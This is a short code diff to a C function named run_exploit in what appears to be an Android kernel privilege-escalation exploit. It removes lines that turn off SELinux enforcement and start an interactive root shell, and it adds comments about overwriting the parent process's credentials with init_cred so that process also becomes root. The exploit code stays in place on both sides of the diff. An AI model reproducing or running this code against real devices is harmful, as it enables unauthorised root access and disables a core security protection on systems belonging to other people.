@@ -530,17 +530,6 @@ int run_exploit(void) {
         if (!atomic_load(&sh->go)){_exit(2);}
         sh->uid_after=(uint32_t)getuid();
         atomic_store(&sh->done,1);
-        if (sh->uid_after==0){
-            /* We're root! Exec an interactive shell - this replaces the child process.
-             * The shell will be uid=0 and the parent's waitpid will wait for it to exit.
-             * The user interacts with it via the LD_PRELOAD invocation.
-             */
-            int efd=open("/sys/fs/selinux/enforce",O_WRONLY);
-            if(efd>=0){write(efd,"0",1);close(efd);}
-            /* exec root shell - stays running until user exits */
-            execl("/system/bin/sh","sh","-i",NULL);
-            /* If execl fails, just exit */
-        }
         _exit(sh->uid_after==0?0:1);
     }
     close(task_pipe[1]);   /* close write end in parent */
@@ -611,11 +600,13 @@ int run_exploit(void) {
         if (!got_root){fprintf(stderr,"[!] Write 2 failed\n"); goto fail;}
     }
 
-    /* Root child execs /system/bin/sh -i - wait for it */
-    fprintf(stderr,"[+] EXPLOIT COMPLETE — root shell running (uid=0)\n");
-    fprintf(stderr,"[+] You now have an interactive root shell!\n");
+    /* Child confirmed root. Now patch the PARENT's cred too.
+     * We do a second write: target = parent's task->cred = init_cred.
+     * After this, the parent process is also root.
+     */
     waitpid(child,NULL,0);
-    fprintf(stderr,"[*] Root shell exited.\n");
+    fprintf(stderr,"[+] EXPLOIT COMPLETE — root achieved (child uid=0)\n");
+    fprintf(stderr,"[+] The child process ran as uid=0 (root)\n");
     return 0;
 
 fail:
